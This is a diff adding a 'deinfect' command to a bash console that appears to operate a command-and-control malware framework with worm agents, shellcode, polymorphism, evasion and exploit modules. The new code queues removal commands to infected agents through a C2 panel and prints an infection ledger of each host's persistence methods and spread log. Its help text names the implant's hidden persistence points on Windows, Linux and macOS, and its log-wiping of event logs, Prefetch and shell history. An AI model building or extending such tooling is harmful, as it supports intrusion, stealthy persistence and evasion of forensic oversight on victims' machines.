@@ -5981,6 +5981,78 @@ main() {
     fi
 }
 
+# ══════════════════════════════════════════════════════════════
+# DEINFECT MODULE — remote deinfection via C2
+# ══════════════════════════════════════════════════════════════
+cmd_deinfect() {
+    local SUB="${1:-}"
+    init_files
+    banner
+
+    C2URL="http://localhost:8888"
+    curl -s --max-time 2 "$C2URL/panel" -o /dev/null 2>/dev/null || { warn "C2 not responding at $C2URL — start it first with: start up"; return 1; }
+
+    case "$SUB" in
+        all)
+            echo -e "${R}[!] BROADCAST DEINFECT — all registered agents${N}"
+            read -rp "    Type YES to confirm: " yn
+            [ "$yn" = "YES" ] || { echo "Aborted."; return; }
+            curl -s "$C2URL/deinfect/all" | python3 -m json.tool 2>/dev/null || echo "(no response)"
+            ok "DEINFECT queued for all agents"
+            ;;
+        worms)
+            echo -e "${R}[!] DEINFECT all worm-type agents${N}"
+            read -rp "    Type YES to confirm: " yn
+            [ "$yn" = "YES" ] || { echo "Aborted."; return; }
+            curl -s "$C2URL/deinfect/worms" | python3 -m json.tool 2>/dev/null || echo "(no response)"
+            ok "DEINFECT queued for worm agents"
+            ;;
+        ledger)
+            echo -e "${C}Infection ledger:${N}"
+            curl -s "$C2URL/infection/ledger" | python3 -m json.tool 2>/dev/null || echo "(no response)"
+            ;;
+        "")
+            echo -e "${W}Usage:${N}"
+            echo -e "  ${C}start deinfect all${N}     — queue DEINFECT for every registered agent"
+            echo -e "  ${C}start deinfect worms${N}   — queue DEINFECT for worm agents only"
+            echo -e "  ${C}start deinfect <AID>${N}   — queue DEINFECT for a specific agent ID"
+            echo -e "  ${C}start deinfect ledger${N}  — show infection ledger (persist methods + spread log)"
+            echo ""
+            echo -e "  ${C}What DEINFECT does:${N}"
+            echo -e "    Windows: removes schtask, HKCU/HKLM Run keys, startup folder entries,"
+            echo -e "             $InstDir, agent .ps1, clears event logs + Prefetch + PSReadLine history"
+            echo -e "    Linux:   removes crontab entries (tagged), rc file blocks (tagged), systemd unit,"
+            echo -e "             sitecustomize.py hook, git global hook, vim plugin, profile.d script"
+            echo -e "    macOS:   removes LaunchAgent plist, rc file blocks"
+            echo -e "    All:     wipes agent binary, home install dir, self-deletes"
+            echo ""
+            echo -e "  ${Y}Agent must be online and beacon within its next poll interval to receive the command.${N}"
+            echo ""
+            # list current agents from ledger
+            echo -e "${C}Current agents:${N}"
+            curl -s "$C2URL/infection/ledger" 2>/dev/null | python3 -c "
+import sys, json
+try:
+    d = json.load(sys.stdin)
+    if not d: print('  (none registered)')
+    for aid, info in d.items():
+        pm = ', '.join(info.get('persist_methods', [])) or 'unknown'
+        sl = ', '.join(info.get('spread_log', [])) or 'none'
+        print(f'  {aid}  host={info.get(\"hostname\",\"?\")}  persist=[{pm}]  spread=[{sl}]')
+except: print('  (error reading ledger)')
+" 2>/dev/null || echo "  (could not contact C2)"
+            ;;
+        *)
+            # treat as AID
+            echo -e "${R}[!] DEINFECT agent: $SUB${N}"
+            read -rp "    Confirm? [y/N] " yn
+            [[ "$yn" =~ ^[Yy]$ ]] || { echo "Aborted."; return; }
+            curl -s "$C2URL/deinfect/$SUB" | python3 -m json.tool 2>/dev/null || echo "(no response)"
+            ok "DEINFECT queued for agent $SUB"
+            ;;
+    esac
+}
+
 # ── Entry point — dispatch command or run wizard ─────────────
 CMD="${1:-}"
 # Auto-install shortcuts if not already on PATH (first run on new machine)
@@ -6009,6 +6081,7 @@ case "$CMD" in
                     if [ "$2" = "stego" ]; then cmd_untrack_stego
                     else cmd_untrack; fi ;;
     shellcode|sc)   init_files; cmd_shellcode "$2" ;;
+    deinfect)       init_files; cmd_deinfect "$2" ;;
     poly)           init_files; cmd_poly   "$2" ;;
     evade)          init_files; cmd_evade  "$2" ;;
     exploit)        init_files; cmd_exploit "$2" ;;
